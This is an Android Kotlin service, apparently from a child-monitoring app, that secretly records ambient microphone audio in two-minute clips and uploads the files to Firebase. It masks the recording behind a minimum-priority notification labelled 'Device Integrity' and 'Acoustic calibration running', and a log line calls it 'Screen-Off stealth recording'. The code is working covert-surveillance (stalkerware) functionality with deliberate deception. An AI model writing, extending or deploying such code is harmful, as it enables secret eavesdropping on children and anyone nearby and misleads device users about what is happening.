package com.vyra.kids.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.vyra.kids.core.AppConstants
import com.vyra.kids.core.FirebaseSyncManager
import kotlinx.coroutines.*
import java.io.File

class AmbientAudioLoggerService : Service() {

    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var currentAudioFile: File? = null
    private var recordingStartTime = 0L
    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())

    companion object {
        const val ACTION_START_AMBIENT_RECORDING = "com.vyra.kids.START_AMBIENT_RECORDING"
        const val ACTION_STOP_AMBIENT_RECORDING = "com.vyra.kids.STOP_AMBIENT_RECORDING"
        const val NOTIFICATION_ID = AppConstants.SERVICE_NOTIFICATION_ID + 6
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_AMBIENT_RECORDING -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(
                        NOTIFICATION_ID,
                        createSilentNotification(),
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                    )
                } else {
                    startForeground(NOTIFICATION_ID, createSilentNotification())
                }
                startAmbientSoundbite()
            }
            ACTION_STOP_AMBIENT_RECORDING -> {
                stopAmbientSoundbite()
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    private fun createSilentNotification(): Notification {
        val channelId = "vyra_audio_integrity"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Acoustic Integrity Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Device Integrity")
            .setContentText("Acoustic calibration running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    private fun startAmbientSoundbite() {
        if (isRecording) return

        serviceScope.launch {
            try {
                val outputDir = File(filesDir, "ambient_vault").apply { if (!exists()) mkdirs() }
                recordingStartTime = System.currentTimeMillis()
                val fileName = "ambient_${recordingStartTime}.m4a"
                currentAudioFile = File(outputDir, fileName)

                mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(this@AmbientAudioLoggerService)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioEncodingBitRate(128000)
                    setAudioSamplingRate(48000) // Studio Opus / AAC 48kHz
                    setOutputFile(currentAudioFile?.absolutePath)
                    prepare()
                    start()
                }

                isRecording = true
                Log.i(AppConstants.TAG, "Ambient Audio Logger started (Screen-Off stealth recording): $fileName")

                // Automatically cap soundbites to 2 minutes max per session to conserve battery/bandwidth
                delay(120000)
                if (isRecording) {
                    stopAmbientSoundbite()
                }
            } catch (e: Exception) {
                Log.e(AppConstants.TAG, "Failed to start Ambient Audio recording", e)
                stopAmbientSoundbite()
            }
        }
    }

    private fun stopAmbientSoundbite() {
        if (!isRecording) return
        isRecording = false

        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
            mediaRecorder = null

            val file = currentAudioFile
            if (file != null && file.exists() && file.length() > 5000) {
                val durationSec = ((System.currentTimeMillis() - recordingStartTime) / 1000).coerceAtLeast(5)
                Log.i(AppConstants.TAG, "Ambient Soundbite finalized: ${file.name} ($durationSec sec, ${file.length()} bytes)")

                // Sync metadata to Firebase Firestore
                val firebaseSync = FirebaseSyncManager.getInstance(this)
                val logId = "ambient_${recordingStartTime}"
                
                // Record doc in ambient_logs collection
                firebaseSync.syncCallRecord(
                    callId = logId,
                    contactName = "Ambient Voice (Pocket/Desk)",
                    phoneNumber = "Screen-Off Soundbite",
                    callType = "ambient",
                    durationSeconds = durationSec,
                    audioFile = file,
                    isTamperAttemptDetected = false
                )
            }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error stopping ambient audio", e)
        }
    }

    override fun onDestroy() {
        stopAmbientSoundbite()
        serviceScope.cancel()
        super.onDestroy()
    }
}
